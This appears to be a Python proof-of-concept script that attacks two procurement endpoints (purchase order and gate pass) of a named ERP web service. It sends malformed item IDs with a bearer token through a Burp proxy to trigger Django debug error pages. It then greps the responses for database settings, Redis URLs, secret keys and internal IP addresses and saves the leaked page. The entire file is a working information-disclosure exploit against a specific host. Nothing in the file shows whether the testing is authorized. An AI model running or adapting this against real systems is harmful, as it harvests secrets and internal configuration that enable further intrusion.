import json
import re
import os
from datetime import datetime

try:
    import requests
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-q"])
    import requests

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://rhythmerp.algorhythms.in"

TOKEN = input("Paste your JWT token: ").strip()

BURP_PROXY = "http://127.0.0.1:8080"
PROXIES = {"http": BURP_PROXY, "https": BURP_PROXY}


def send(url, body):
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "X-Tenant-ID": "711",
        "Content-Type": "application/json",
    }
    try:
        resp = requests.post(
            url, json=body, headers=headers,
            proxies=PROXIES, verify=False, timeout=15,
        )
        return resp.status_code, resp.text
    except requests.exceptions.ConnectionError:
        return 0, "ERROR: Cannot connect to Burp proxy. Is Burp running?"
    except Exception as e:
        return 0, f"ERROR: {e}"


def check_leaks(text, label):
    keywords = {
        "DATABASES":    "DB config",
        "REDIS":        "Redis URL",
        "CORE_URL":     "Internal microservice URL",
        "SECRET_KEY":   "Django secret key (masked)",
        "192.168":      "Internal IP address",
        "erp_procure":  "Database name",
        "envconfig":    "Leaked code line",
        "Exception":    "Exception details",
        "ALLOWED_HOSTS": "Allowed hosts list",
    }
    print(f"\n  {'='*50}")
    print(f"  {label}")
    print(f"  {'='*50}")
    print(f"  Status: {text.get('status', '?')}, Size: {len(text.get('body', ''))} bytes")
    if text["status"] == 500 and len(text["body"]) > 10000:
        print(f"  {'='*50}")
        print(f"  LEAKED INFO FOUND:")
        for kw, desc in keywords.items():
            if kw in text["body"]:
                idx = text["body"].index(kw)
                snippet = text["body"][idx: idx + 120]
                clean = re.sub(r'<[^>]+>', '', snippet).strip()[:100]
                print(f"  [{desc:35s}] {clean}")
        return True
    elif text["status"] in (200, 201):
        print(f"  [SAFE] Accepted normally (no leak)")
    elif text["status"] in (400, 422):
        print(f"  [SAFE] Properly validated/rejected (no leak)")
    elif text["status"] == 403:
        print(f"  [ERROR] Token expired or invalid — get a fresh one")
    else:
        print(f"  Response preview: {text['body'][:200]}")
    return False


results = []

# ── Test 1: Purchase Order ──
print("\n[*] Sending PO attack with item_ref_id=999999999...")
body = {
    "transaction_date": "2026-06-14",
    "supplier_ref_id": 1,
    "supplier_ref_type": "Supplier",
    "po_item_type": 113,
    "po_type": 25,
    "purchasing_order_items_details": [
        {"item_ref_id": 999999999, "quantity": 10, "rate": 100}
    ],
}
status, resp_text = send(f"{BASE}/procure_to_pay/purchase_order/", body)
res = check_leaks({"status": status, "body": resp_text}, "TEST 1: Purchase Order")
results.append(res)

# ── Test 2: Gate Pass ──
print("\n[*] Sending GP attack with item_ref_id=999999999...")
body = {
    "transaction_date": "2026-06-14",
    "supplier_ref_id": 1,
    "supplier_ref_type": "Supplier",
    "item_type_ref_id": 113,
    "delivery_type": 29,
    "driver_name": "Leak Test",
    "in_time": "2026-06-14T09:00:00Z",
    "distance": 50,
    "grn_check": False,
    "qc_check": False,
    "parameter1": 1,
    "gate_pass_details": [
        {
            "item_ref_id": 999999999,
            "no_of_bags": 10,
            "quantity": 100.0,
            "base_uom": 4,
            "hsn_sac_no": 2,
        }
    ],
}
status, resp_text = send(f"{BASE}/procure_to_pay/gate-pass/", body)
res = check_leaks({"status": status, "body": resp_text}, "TEST 2: Gate Pass")
results.append(res)

# ── Summary ──
print(f"\n{'='*60}")
print("  SUMMARY")
print(f"{'='*60}")
if any(results):
    print("  VULNERABLE: Django DEBUG mode enabled in production!")
    print(f"  {sum(results)}/{len(results)} endpoints leaked full config.")
    print("  Go to Burp -> HTTP History -> find the 500 requests -> click response.")
else:
    print("  No leaks detected (may need fresh token).")

# Save response
ts = datetime.now().strftime("%Y%m%d_%H%M%S")
out = os.path.join(os.path.dirname(__file__), f"debug_leak_{ts}.html")
with open(out, "w", encoding="utf-8") as f:
    f.write(resp_text)
print(f"\n[*] Full HTML saved to: {out}")
print("[*] Open that file in a browser to see the full Django debug page.")
